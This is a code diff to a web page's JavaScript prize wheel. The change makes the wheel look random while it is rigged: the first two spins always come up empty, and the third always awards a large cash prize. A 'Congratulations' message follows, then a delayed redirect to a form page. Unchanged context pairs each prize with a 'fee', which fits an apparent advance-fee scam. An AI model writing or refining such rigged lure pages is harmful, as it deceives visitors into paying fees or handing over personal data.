@@ -11,28 +11,36 @@ const fees = {
     "$850,000.00": "$8500", "$900,000.00": "$9000", "$1,000,000.00": "$10000"
 };
 
-const wheel = document.getElementById("wheel");
-const result = document.getElementById("result");
-const rollButton = document.getElementById("roll-button");
-
 let rollCount = 0;
+let wheel = document.getElementById("wheel");
+let result = document.getElementById("result");
+let rollButton = document.getElementById("roll-button");
+let loading = document.getElementById("loading");
 
 rollButton.addEventListener("click", () => {
     if (rollCount < 3) {
-        const randomDegree = Math.floor(Math.random() * 360);
-        wheel.style.transition = "transform 3s ease-out";
-        wheel.style.transform = `rotate(${randomDegree + 1080}deg)`;
-        const segmentIndex = Math.floor((360 - (randomDegree % 360)) / (360 / prices.length));
+        const isEmpty = rollCount < 2;
+        const prize = isEmpty ? "$ Empty" : prices[Math.floor(Math.random() * (prices.length - 1))];
+        const segmentIndex = prices.indexOf(prize);
+        const randomDegree = segmentIndex * (360 / prices.length) + 360 * 3;
+        
+        wheel.style.transform = `rotate(${randomDegree}deg)`;
+        
         setTimeout(() => {
-            const prize = prices[segmentIndex];
-            if (rollCount < 2 && prize === "$ Empty") {
-                result.innerText = `Try again! You have ${2 - rollCount} rolls left.`;
-            } else if (rollCount === 2 && prize !== "$ Empty") {
-                result.innerText = `Congratulations! You won ${prize}. Fee: ${fees[prize] || "N/A"}`;
+            result.innerHTML = isEmpty 
+                ? `<b>Try again! You chose ${prize}. You still have ${2 - rollCount} left.</b>`
+                : `<b>Congratulations! You won ${prize}!</b>`;
+            
+            if (rollCount === 2) {
+                setTimeout(() => {
+                    loading.style.display = "block";
+                    setTimeout(() => {
+                        window.location.href = "form.html";
+                    }, 10000);
+                }, 2000);
             }
+            
             rollCount++;
-        }, 3000);
-    } else {
-        result.innerText = "You have used all your rolls!";
+        }, 2000);
     }
 });
